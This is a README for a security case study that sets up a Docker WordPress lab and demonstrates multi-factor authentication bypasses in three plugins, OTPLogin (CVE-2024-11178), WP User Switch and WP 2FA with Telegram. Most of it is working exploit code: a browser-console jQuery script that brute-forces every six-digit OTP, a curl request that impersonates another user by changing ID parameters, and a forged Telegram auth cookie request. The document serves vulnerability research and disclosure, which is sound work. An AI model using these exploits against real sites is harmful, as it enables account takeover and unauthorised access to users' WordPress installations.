# WordPress Multi-factor Authentication Experiments

## Introduction

I created a case study about several multi-factor authentication vulnerabilities using ***WordPress*** and vulnerable plugins that had no publicly available proof of concept:

- WP User Switch
- OTPLogin 
- WP 2FA with Telegram
- AppPresser (can't be exploited due to paywall, static analysis only)

## Setup

run `docker-compose -f docker-compose.yml up -d` and go to `localhost:8080`, where you can set the admin username, email and password. 

To activate the plugins, simply go to the Dashboard - Plugins - Click `Activate` on what plugin you want to activate.

## OTPLogin - CVE-2024-11178

For OTPLogin I created a simple JQuery script that can be ran inside the browser console, since that plugin doesn't have any rate limiting at all, and we needed that specific nonce.

First, call the password reset function from the `admin-ajax.php`:

```javascript
const email = 'admin@admin.com'; // use a real user, in my case I used this for testing purposes
const nonce = jQuery('[name="otplsecurity"]').val(); // grabs nonce from hidden input

jQuery.ajax({
  url: '/wp-admin/admin-ajax.php?action=otplaction',
  method: 'POST',
  data: {
    email: email,
    otplzplussecurity: '',
    otplsecurity: nonce,
    validateotp: 0
  },
  success: function (res) {
    console.log('[+] Response from OTP generation:');
    console.log(res);
  },
  error: function (xhr) {
    console.log('[!] Request failed:', xhr.responseText);
  }
});
```

Second, run the brute-force script:

```javascript
const email = 'admin@admin.com';           // Use a valid WP user
const nonce = jQuery('[name="otplsecurity"]').val(); // Grab nonce from the form


if (!nonce) {
  console.error('No nonce found');
} else {
  for(let otp = 100000; otp <= 999999; otp += 1) {
    jQuery.ajax({
      url: '/wp-admin/admin-ajax.php?action=otplaction',
      method: 'POST',
      data: {
        email: email,
        email_otp: otp,
        otplzplussecurity: '',
        otplsecurity: nonce,
        validateotp: 1
      },
      success: function (res) {
        console.log('OTP Validation Response:', res);
        if (res.status === 1 && res.response?.includes('OTP Matched')) {
          console.log('OTP Valid, you logged in');
          if (res.redirect) {
            console.log('Redirect to:', res.redirect);
          }
        } else {
          console.log('OTP INVALID or error:', res.message);
        }
      },
      error: function (xhr) {
        console.error('[!] Request failed:', xhr.responseText);
      }
    });
  }
}
```

## WP User Switch

The vulnerability appears when you change the **wpus_username** parameter and the **userid** as shown in the curl script. If you know a user and its id, you can log in as that specific user by changing the parameters. This request can be caught using Burp Suite:

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: localhost:8080' -H $'Referer: http://localhost:8080/wp-admin/users.php?id=3' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    -b $'wordpress_37d007a56d816107ce5b52c10342db37=admin%[...]; wpus_who_switch=admin; wp-settings-time-2=1748241284; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_37d007a56d816107ce5b52c10342db37=admin%[...]; wp-settings-time-1=1749030499' \
    $'http://localhost:8080/wp-admin/admin.php?page=wp-userswitch&wpus_username=test1&wpus_userid=2&redirect=/wp-admin/users.php?update=add&id=3&wpus_nonce=ea8b1298a5'
```


## WP 2FA with Telegram

For this vulnerability to work you might actually need to configure a telegram bot for the second factor authentication to appear after logging in with username and password.

The vulnerability occurs because of the improper verification of the auth_tg_cookie that can be changed in `SHA1(authcode)`, where `authcode` can also be manipulated by the user.

After setting the specific bot, the vulnerability can be tested using this request:

```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: localhost:8080' -H $'Content-Length: 139' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"' -H $'sec-ch-ua-mobile: ?0' -H $'sec-ch-ua-platform: \"Linux\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Origin: http://localhost:8080' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: http://localhost:8080/wp-login.php' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    -b $'wp-settings-time-2=1748241284; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; auth_tg_cookie=7110eda4d09e062aa5e4a390b0a572ac0d2c0220' \
    --data-binary $'nonce=6fdb8ab8a9&wp-auth-id=1&redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&rememberme=0&authcode=1234&submit=Login+with+Telegram' \
    $'http://localhost:8080/wp-login.php?action=validate_tg'
```

